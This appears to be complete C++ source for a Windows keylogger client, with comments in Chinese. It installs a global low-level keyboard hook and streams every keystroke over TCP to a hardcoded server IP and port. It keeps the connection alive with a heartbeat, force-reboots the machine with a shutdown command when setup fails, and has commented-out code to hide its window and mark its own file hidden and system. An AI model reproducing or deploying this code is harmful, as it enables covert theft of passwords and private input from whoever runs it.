#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <thread>
#define SEND_SIZE 6//禁止修改
#define RECV_SIZE 32//与服务端适配
#define PORT 33561//与服务端适配
#define SERVER_IP "10.5.11.179"//与服务端适配
#define sleep(x) this_thread::sleep_for(chrono::milliseconds(x))

using namespace std;

HHOOK keyboardHook=0;//钩子句柄

int heart_beat,connected;
WORD winsock_version;
WSADATA wsa_data;
SOCKET client_socket;
struct sockaddr_in server_addr;
char cmd_attrib[256];

void print(const char *str){printf("[% *.3f] %s\n",10,(double)clock()/1000,str);}
void print(const char *str1,const char *str2){printf("[% *.3f] %s%s\n",10,(double)clock()/1000,str1,str2);}
//状态输出
LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode,_In_ WPARAM wParam,_In_ LPARAM lParam){
	if(!connected)return CallNextHookEx(NULL,nCode,wParam,lParam);
	KBDLLHOOKSTRUCT *ks=(KBDLLHOOKSTRUCT*)lParam;
	char send_data[SEND_SIZE+1]={0};
	itoa(ks->vkCode,send_data,10);
	int len=strlen(send_data),flag=3;
	while(len<=3)send_data[len++]='a';
	send_data[4]=(ks->flags<64?'1':'0'),send_data[5]='p';
	while(flag--){
		if(send(client_socket,send_data,SEND_SIZE,0)<0)print("Failed to send keyboard data! Retrying...");
		else{
			print("Send: ",send_data);
			break;
		}
	}
	return CallNextHookEx(NULL,nCode,wParam,lParam);
}
//以上为键盘处理
bool make_hook(){
	int flag=5;
	while(flag!=-1&&flag!=0){
		keyboardHook=SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,GetModuleHandleA(NULL),NULL);
		if(keyboardHook==0)print("Failed to init hook! Retrying..."),flag--,sleep(1000);
		else flag=-1;
	}
	return flag==0;
}
bool make_socket(){
	int flag=5;
	while(flag!=-1&&flag!=0){
		winsock_version=MAKEWORD(2,2);
		if(WSAStartup(winsock_version,&wsa_data))print("Failed to init socket! Retrying..."),flag--,sleep(1000);
		else flag=-1;
	}
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(PORT);
	server_addr.sin_addr.S_un.S_addr=inet_addr(SERVER_IP);
	return flag==0;
}
bool make_client(){
	int flag=5;
	while(flag!=-1&&flag!=0){
		client_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(client_socket==INVALID_SOCKET)print("Failed to create client socket! Retrying..."),flag--,sleep(1000);
		else flag=-1;
	}
	return flag==0;
}
bool reconnect(){
	connected=0;
	closesocket(client_socket);
	if(make_client())return 1;
	print("Connecting...");
	if(connect(client_socket,(LPSOCKADDR)&server_addr,sizeof(server_addr))==SOCKET_ERROR)print("Failed to connect!");
	else print("Succeeded to connect!"),connected=1;
	return 0;
}
void init(){
	print("Initializing...");
	if(make_hook()||make_socket())print("Initializing error!"),system("shutdown -r -f -t 0"),exit(1);
}
//以上为初始化
void auto_connect(){
	while(1){
		if(heart_beat<=2){
			if(reconnect())print("Socket creating error!"),system("shutdown -r -f -t 0"),exit(1);
		}
		heart_beat=0;
		sleep(5000);
	}
}
void auto_send(){
	while(1){
		if(connected){
			if(send(client_socket,"a0000p",SEND_SIZE,0)<0)print("Failed to send heart beat!");
			else heart_beat++;
		}
		sleep(1000);
	}
}
void auto_recv(){
	char recv_data[RECV_SIZE+1];
	while(1){
		if(connected){
			int len=recv(client_socket,recv_data,RECV_SIZE,0);
			if(len>=0){
				recv_data[len]=0;
				heart_beat++;
				print("Echo from server: ",recv_data);
			}			
		}
		sleep(5);
	}
}
//以上为tcp连接管理
int main(int argc,char **argv){
//	HWND now=GetForegroundWindow();
//	ShowWindow(now,SW_HIDE);
//	sprintf(cmd_attrib,"attrib \"%s\" +s +h",argv[0]);
//	system(cmd_attrib);

	init();
	thread conn_magr(auto_connect);
	thread recv_beat(auto_recv);
	thread send_beat(auto_send);
	conn_magr.detach();
	recv_beat.detach();
	send_beat.detach();
	
	MSG msg;
	while(GetMessage(&msg,NULL,NULL,NULL)){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	UnhookWindowsHookEx(keyboardHook);
	closesocket(client_socket);
	WSACleanup();
	return 0;
}
